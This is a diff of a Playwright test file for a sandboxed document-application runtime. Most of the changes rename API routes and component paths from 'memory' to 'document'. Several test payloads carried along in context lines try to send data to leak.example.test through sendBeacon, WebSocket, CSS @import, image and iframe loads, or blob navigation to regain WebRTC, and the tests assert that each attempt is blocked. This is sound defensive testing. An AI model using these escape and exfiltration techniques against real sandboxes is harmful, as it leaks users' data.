@@ -29,11 +29,11 @@ for (const width of [1440, 390]) test(`static styled documents keep a small runt
   const html = `<style>.inventory{border-collapse:collapse;width:100%}.inventory th,.inventory td{padding:8px;border:1px solid #777}</style><h2>Synthetic inventory</h2><table class="inventory">${rows}</table><details><summary>Show totals</summary><p>18 items available</p></details>`
   const item = { ...document, content_profile: 'document', media_type: 'text/html', payload: { text: html } }
   await jsonRoute(page, '**/api/agents?*', [agent])
-  await jsonRoute(page, '**/api/memory/documents/owner-options?*', { agents: [{ id: 7, kind: 'agent', label: 'Alice', subtitle: '', avatar_url: null }], users: [] })
-  await jsonRoute(page, '**/api/memory/documents/keywords?*', [])
-  await jsonRoute(page, '**/api/memory/documents/doc-a?*', { item, agent_id: 7 })
-  await jsonRoute(page, '**/api/memory/documents/doc-a/attachments?*', [])
-  await mount(page, 'app/memory/components/DocumentEditor.vue', { props: { documentId: 'doc-a', agentId: 7 }, privileges: ['MEMORY_EDIT'] })
+  await jsonRoute(page, '**/api/documents/owner-options?*', { agents: [{ id: 7, kind: 'agent', label: 'Alice', subtitle: '', avatar_url: null }], users: [] })
+  await jsonRoute(page, '**/api/documents/keywords?*', [])
+  await jsonRoute(page, '**/api/documents/doc-a?*', { item, agent_id: 7 })
+  await jsonRoute(page, '**/api/documents/doc-a/attachments?*', [])
+  await mount(page, 'app/document/components/DocumentEditor.vue', { props: { documentId: 'doc-a', agentId: 7 }, privileges: ['DOCUMENT_EDIT'] })
   const content = inner(page)
   await expect(content.getByRole('heading', { name: 'Synthetic inventory' })).toBeVisible()
   await expect(content.getByRole('row')).toHaveCount(6)
@@ -57,7 +57,7 @@ for (const entry of ['javascript', 'script', 'handler']) test(`the local 3D libr
   if (entry === 'javascript') app.javascript = code
   else if (entry === 'script') app.html += `<script>${code}</script>`
   else app.html += `<button onclick="${code}">Check library</button>`
-  await mount(page, 'app/memory/components/DocumentApplication.vue', { props: { ...runtimeProps, app } })
+  await mount(page, 'app/document/components/DocumentApplication.vue', { props: { ...runtimeProps, app } })
   if (entry === 'handler') await inner(page).getByRole('button', { name: 'Check library' }).click()
   await expect(inner(page).getByRole('status')).toHaveText('Scene, function, function')
 })
@@ -69,7 +69,7 @@ for (const width of [1440, 390]) test(`isolated HTML follows the host theme with
     css: 'body{color:#222;font-family:system-ui;line-height:1.5} h2{margin-top:0} div{padding:12px} label{display:block} button{background:#087ff5;color:#fff;border:0;padding:8px}',
     javascript: 'window.runs=(window.runs||0)+1; document.querySelector("button").onclick=()=>document.querySelector("output").textContent=Number(document.querySelector("output").textContent)+1;',
   }
-  await mount(page, 'app/memory/components/DocumentApplication.vue', { props: { documentId: 'synthetic-theme', revision: 1, app }, dark: false })
+  await mount(page, 'app/document/components/DocumentApplication.vue', { props: { documentId: 'synthetic-theme', revision: 1, app }, dark: false })
   const content = inner(page)
   await expect(content.getByRole('heading', { name: 'Theme sample' })).toBeVisible()
   await content.getByRole('textbox', { name: 'Draft' }).fill('Unsaved synthetic draft')
@@ -100,10 +100,10 @@ for (const width of [1440, 390]) test(`isolated HTML follows the host theme with
 
 test('a failed native photo load stops the application and a new revision retries with current access', async ({ page }) => {
   let denied = true
-  await page.route(`**/api/memory/documents/${datasetId}/attachments/${photoId}*`, route => denied
+  await page.route(`**/api/documents/${datasetId}/attachments/${photoId}*`, route => denied
     ? route.fulfill({ status: 403, json: { detail: 'Photo access denied' } })
     : route.fulfill({ contentType: 'image/png', body: photoBytes }))
-  await mount(page, 'app/memory/components/DocumentApplication.vue', { props: {
+  await mount(page, 'app/document/components/DocumentApplication.vue', { props: {
     ...runtimeProps, app: { ...definition, html: `<img src="${photoUri}" alt="Synthetic photo">` + definition.html },
   } })
   await expect(page.getByRole('alert')).toBeVisible()
@@ -119,11 +119,11 @@ test('a late native photo response cannot restart an application from an older r
   let release
   const waiting = new Promise(resolve => { release = resolve })
   let requested = false
-  await page.route(`**/api/memory/documents/${datasetId}/attachments/${photoId}*`, async route => {
+  await page.route(`**/api/documents/${datasetId}/attachments/${photoId}*`, async route => {
     requested = true; await waiting
     await route.fulfill({ contentType: 'image/png', body: photoBytes }).catch(() => {})
   })
-  await mount(page, 'app/memory/components/DocumentApplication.vue', { props: {
+  await mount(page, 'app/document/components/DocumentApplication.vue', { props: {
     ...runtimeProps, app: { ...definition, html: `<img src="${photoUri}" alt="Old photo">` + definition.html },
   } })
   await expect.poll(() => requested).toBe(true)
@@ -137,12 +137,12 @@ test('a late native photo response cannot restart an application from an older r
 test('a form submits once with revisions and handles a conflict without losing input', async ({ page }) => {
   const requests = []
   let conflict = false
-  await page.route('**/api/memory/documents/doc-a/apps/responses/datasets/entries', route => {
+  await page.route('**/api/documents/doc-a/apps/responses/datasets/entries', route => {
     const body = route.request().postDataJSON(); requests.push(body)
     if (body.operation === 'read') return route.fulfill({ json: { revision: 4, data: [] } })
     return conflict ? route.fulfill({ status: 409, json: { detail: 'Dataset changed' } }) : route.fulfill({ json: { revision: 5, data: [body.value] } })
   })
-  await mount(page, 'app/memory/components/DocumentApplication.vue', { props: runtimeProps })
+  await mount(page, 'app/document/components/DocumentApplication.vue', { props: runtimeProps })
   expect(requests).toEqual([])
   await inner(page).getByRole('textbox', { name: 'Answer' }).fill('Synthetic answer')
   await inner(page).getByRole('button', { name: 'Submit' }).click()
@@ -173,7 +173,7 @@ test('the sandbox blocks host DOM, storage, network and self-navigation and deni
       document.getElementById('result').textContent = results.join(', ');
       document.getElementById('navigate').onclick = () => { location.href = 'https://leak.example.test/navigation'; };
     })();` }
-  await mount(page, 'app/memory/components/DocumentApplication.vue', { props: { ...runtimeProps, app } })
+  await mount(page, 'app/document/components/DocumentApplication.vue', { props: { ...runtimeProps, app } })
   await expect(inner(page).getByRole('status')).toHaveText('DOM blocked, storage blocked, network blocked, Dataset blocked')
   await inner(page).getByRole('button', { name: 'Navigate' }).click()
   await expect(page.locator('iframe')).toHaveCount(0)
@@ -185,11 +185,11 @@ test('a new document revision stops the application and discards late Dataset re
   let release
   const waiting = new Promise(resolve => { release = resolve })
   let requests = 0
-  await page.route('**/api/memory/documents/doc-a/apps/responses/datasets/entries', async route => {
+  await page.route('**/api/documents/doc-a/apps/responses/datasets/entries', async route => {
     ++requests; await waiting
     await route.fulfill({ json: { revision: 4, data: [] } }).catch(() => {})
   })
-  await mount(page, 'app/memory/components/DocumentApplication.vue', { props: runtimeProps })
+  await mount(page, 'app/document/components/DocumentApplication.vue', { props: runtimeProps })
   await inner(page).getByRole('textbox').fill('Pending')
   await inner(page).getByRole('button', { name: 'Submit' }).click()
   await expect.poll(() => requests).toBe(1)
@@ -207,22 +207,22 @@ for (const format of ['legacy', 'html']) test(`the normal editor preserves ${for
   const photo = `<img src="${uri}" alt="Synthetic photo">`
   const raw = '<p>Introduction</p><p class="note">Photo before the calculator</p>' + photo + definition.html + '<script>' + definition.javascript + '</script><p>After the form</p>'
   const withPhoto = { ...definition, html: '<p class="note">Photo before the calculator</p>' + photo + definition.html }
-  await page.route(`**/api/memory/documents/${datasetId}/attachments/${attachmentId}?*`, route => route.fulfill({
+  await page.route(`**/api/documents/${datasetId}/attachments/${attachmentId}?*`, route => route.fulfill({
     contentType: 'image/png', body: photoBytes,
   }))
   let current = { ...document, content_profile: 'document', media_type: 'text/html', payload: { text: format === 'html' ? raw : content(withPhoto) } }
   const writes = []
   await jsonRoute(page, '**/api/agents?*', [agent])
-  await jsonRoute(page, '**/api/memory/documents/owner-options?*', { agents: [{ id: 7, kind: 'agent', label: 'Alice', subtitle: '', avatar_url: null }], users: [] })
-  await jsonRoute(page, '**/api/memory/documents/keywords?*', [])
-  await jsonRoute(page, '**/api/memory/documents/doc-a/attachments?*', [])
-  await page.route(/\/api\/memory\/documents\/doc-a(?:\?.*)?$/, route => {
+  await jsonRoute(page, '**/api/documents/owner-options?*', { agents: [{ id: 7, kind: 'agent', label: 'Alice', subtitle: '', avatar_url: null }], users: [] })
+  await jsonRoute(page, '**/api/documents/keywords?*', [])
+  await jsonRoute(page, '**/api/documents/doc-a/attachments?*', [])
+  await page.route(/\/api\/documents\/doc-a(?:\?.*)?$/, route => {
     if (route.request().method() === 'GET') return route.fulfill({ json: { item: current, agent_id: 7 } })
     const body = route.request().postDataJSON(); writes.push(body)
     current = { ...current, ...body, revision: current.revision + 1 }
     return route.fulfill({ json: current })
   })
-  await mount(page, 'app/memory/components/DocumentEditor.vue', { props: { documentId: 'doc-a', agentId: 7 }, privileges: ['MEMORY_EDIT'] })
+  await mount(page, 'app/document/components/DocumentEditor.vue', { props: { documentId: 'doc-a', agentId: 7 }, privileges: ['DOCUMENT_EDIT'] })
   await expect(inner(page).getByRole('textbox', { name: 'Answer' })).toBeVisible()
   await expect.poll(() => inner(page).getByRole('img', { name: 'Synthetic photo' }).evaluate(image => image.naturalWidth)).toBeGreaterThan(0)
   await expect(page.getByRole('button', { name: /Edit document|Show applications|Add form/ })).toHaveCount(0)
@@ -292,11 +292,11 @@ test('narrow document panels keep embedded form controls reachable while scrolli
   const app = { id: 'reachable-form', title: 'Synthetic form', html: '<form><label>Answer <input></label><button>Submit</button></form><output>Waiting</output>',
     javascript: 'document.querySelector("form").onsubmit=event=>{event.preventDefault();document.querySelector("output").textContent=document.querySelector("input").value;}' }
   await jsonRoute(page, '**/api/agents?*', [agent])
-  await jsonRoute(page, '**/api/memory/documents/owner-options?*', { agents: [{ id: 7, kind: 'agent', label: 'Alice', subtitle: '', avatar_url: null }], users: [] })
-  await jsonRoute(page, '**/api/memory/documents/keywords?*', [])
-  await jsonRoute(page, '**/api/memory/documents/doc-a/attachments?*', [])
-  await jsonRoute(page, /\/api\/memory\/documents\/doc-a(?:\?.*)?$/, { item: { ...document, content_profile: 'document', media_type: 'text/html', payload: { text: content(app) } }, agent_id: 7 })
-  await mount(page, 'app/memory/components/DocumentEditor.vue', { props: { documentId: 'doc-a', agentId: 7 }, privileges: ['MEMORY_EDIT'] })
+  await jsonRoute(page, '**/api/documents/owner-options?*', { agents: [{ id: 7, kind: 'agent', label: 'Alice', subtitle: '', avatar_url: null }], users: [] })
+  await jsonRoute(page, '**/api/documents/keywords?*', [])
+  await jsonRoute(page, '**/api/documents/doc-a/attachments?*', [])
+  await jsonRoute(page, /\/api\/documents\/doc-a(?:\?.*)?$/, { item: { ...document, content_profile: 'document', media_type: 'text/html', payload: { text: content(app) } }, agent_id: 7 })
+  await mount(page, 'app/document/components/DocumentEditor.vue', { props: { documentId: 'doc-a', agentId: 7 }, privileges: ['DOCUMENT_EDIT'] })
   await page.locator('.document-editor').evaluate(element => {
     const panel = document.createElement('div')
     panel.style.cssText = 'margin-top:300px;height:700px;overflow:auto;scroll-padding-top:1rem'
@@ -333,17 +333,17 @@ for (const format of ['legacy', 'html']) test(`printing and PDF preserve the dis
   }
   const html = format === 'legacy' ? content(app) : '<p>Introduction</p><style>' + app.css + '</style>' + app.html + '<script>' + app.javascript + '</script><p>After the form</p>'
   await jsonRoute(page, '**/api/agents?*', [agent])
-  await jsonRoute(page, '**/api/memory/documents/owner-options?*', { agents: [{ id: 7, kind: 'agent', label: 'Alice', subtitle: '', avatar_url: null }], users: [] })
-  await jsonRoute(page, '**/api/memory/documents/keywords?*', [])
-  await jsonRoute(page, '**/api/memory/documents/doc-a/attachments?*', [])
-  await jsonRoute(page, /\/api\/memory\/documents\/doc-a(?:\?.*)?$/, { item: { ...document, content_profile: 'document', media_type: 'text/html', payload: { text: html } }, agent_id: 7 })
+  await jsonRoute(page, '**/api/documents/owner-options?*', { agents: [{ id: 7, kind: 'agent', label: 'Alice', subtitle: '', avatar_url: null }], users: [] })
+  await jsonRoute(page, '**/api/documents/keywords?*', [])
+  await jsonRoute(page, '**/api/documents/doc-a/attachments?*', [])
+  await jsonRoute(page, /\/api\/documents\/doc-a(?:\?.*)?$/, { item: { ...document, content_profile: 'document', media_type: 'text/html', payload: { text: html } }, agent_id: 7 })
   let snapshot, exports = 0
-  await page.route('**/api/memory/documents/doc-a/export-pdf', route => {
+  await page.route('**/api/documents/doc-a/export-pdf', route => {
     ++exports
     snapshot = route.request().postDataJSON().html
     return route.fulfill({ contentType: 'application/pdf', body: '%PDF-1.7\nfixture' })
   })
-  await mount(page, 'app/memory/components/DocumentEditor.vue', { props: { documentId: 'doc-a', agentId: 7 }, privileges: ['MEMORY_EDIT'] })
+  await mount(page, 'app/document/components/DocumentEditor.vue', { props: { documentId: 'doc-a', agentId: 7 }, privileges: ['DOCUMENT_EDIT'] })
   await page.locator('.tiptap-galaris-editor').evaluate(element => { element.style.width = '320px' })
   const runtime = page.frameLocator('.document-application-frame').frameLocator('iframe')
   await runtime.getByRole('textbox', { name: 'Amount' }).fill('125')
@@ -411,10 +411,10 @@ for (const format of ['legacy', 'html']) test(`printing and PDF preserve the dis
 
 test('missing consent and backend quotas keep the form visible and preserve input', async ({ page }) => {
   let status = 403
-  await page.route('**/api/memory/documents/doc-a/apps/responses/datasets/entries', route => route.fulfill({
+  await page.route('**/api/documents/doc-a/apps/responses/datasets/entries', route => route.fulfill({
     status, json: { detail: status === 403 ? { code: 'permission_required' } : 'Quota exhausted' },
   }))
-  await mount(page, 'app/memory/components/DocumentApplication.vue', { props: runtimeProps })
+  await mount(page, 'app/document/components/DocumentApplication.vue', { props: runtimeProps })
   await inner(page).getByRole('textbox').fill('Keep this answer')
   await inner(page).getByRole('button', { name: 'Submit' }).click()
   await expect(inner(page).getByRole('status')).toHaveText('permission_required')
@@ -439,7 +439,7 @@ test('malicious scripts cannot restore WebRTC constructors or escape through res
       try { navigator.sendBeacon('https://leak.example.test/beacon', 'synthetic'); } catch {}
       try { new WebSocket('wss://leak.example.test/socket'); } catch {}
       document.querySelector('[role=status]').textContent = String(blocked);` }
-  await mount(page, 'app/memory/components/DocumentApplication.vue', { props: { ...runtimeProps, app } })
+  await mount(page, 'app/document/components/DocumentApplication.vue', { props: { ...runtimeProps, app } })
   await expect(inner(page).getByRole('status')).toHaveText('6')
   await inner(page).getByRole('button', { name: 'Send' }).click()
   expect(outbound).toEqual([])
@@ -447,7 +447,7 @@ test('malicious scripts cannot restore WebRTC constructors or escape through res
 
 test('message saturation is bounded before it reaches the API', async ({ page }) => {
   let requests = 0
-  await page.route('**/api/memory/documents/doc-a/apps/responses/datasets/entries', route => { ++requests; return route.fulfill({ json: { revision: 1, data: [] } }) })
+  await page.route('**/api/documents/doc-a/apps/responses/datasets/entries', route => { ++requests; return route.fulfill({ json: { revision: 1, data: [] } }) })
   const app = { ...definition, html: '<p role="status"></p>', javascript: `
     (async () => {
       let rejected = 0;
@@ -456,7 +456,7 @@ test('message saturation is bounded before it reaches the API', async ({ page })
       }
       document.querySelector('[role=status]').textContent = String(rejected);
     })();` }
-  await mount(page, 'app/memory/components/DocumentApplication.vue', { props: { ...runtimeProps, app } })
+  await mount(page, 'app/document/components/DocumentApplication.vue', { props: { ...runtimeProps, app } })
   await expect(inner(page).getByRole('status')).toHaveText('10')
   expect(requests).toBe(120)
 })
@@ -464,7 +464,7 @@ test('message saturation is bounded before it reaches the API', async ({ page })
 test('forged export HTML cannot load external resources or execute scripts during layout', async ({ page }) => {
   const outbound = []
   await page.route('https://leak.example.test/**', route => { outbound.push(route.request().url()); return route.fulfill({ body: '' }) })
-  await mount(page, 'app/memory/components/DocumentApplication.vue', { props: { ...runtimeProps, app: { id: 'static', title: 'Static', html: '<p>Visible</p>' } } })
+  await mount(page, 'app/document/components/DocumentApplication.vue', { props: { ...runtimeProps, app: { id: 'static', title: 'Static', html: '<p>Visible</p>' } } })
   const result = await page.evaluate(async () => {
     const { layoutDocumentRendering } = await import('/core/util/layoutDocumentRendering.ts')
     const html = '<html><head><style>@import url("https://leak.example.test/css");p{background:url("https://leak.example.test/background")}</style></head><body><p>Preserved</p><img src="https://leak.example.test/image?secret=synthetic" onerror="top.exportEscaped=true"><iframe src="https://leak.example.test/frame"></iframe><script>top.exportEscaped=true</script><form action="https://leak.example.test/form"><input value="Kept"></form></body></html>'
@@ -490,7 +490,7 @@ test('a script cannot navigate to a fresh executable blob to regain WebRTC', asy
       location.href = URL.createObjectURL(new Blob([code], {type: 'text/html'}));
     } catch { document.querySelector('[role=status]').textContent = 'Blocked'; }
   ` }
-  await mount(page, 'app/memory/components/DocumentApplication.vue', { props: { ...runtimeProps, app } })
+  await mount(page, 'app/document/components/DocumentApplication.vue', { props: { ...runtimeProps, app } })
   await expect(inner(page).getByRole('status')).toHaveText('Blocked')
   expect(escaped).toEqual([])
 })
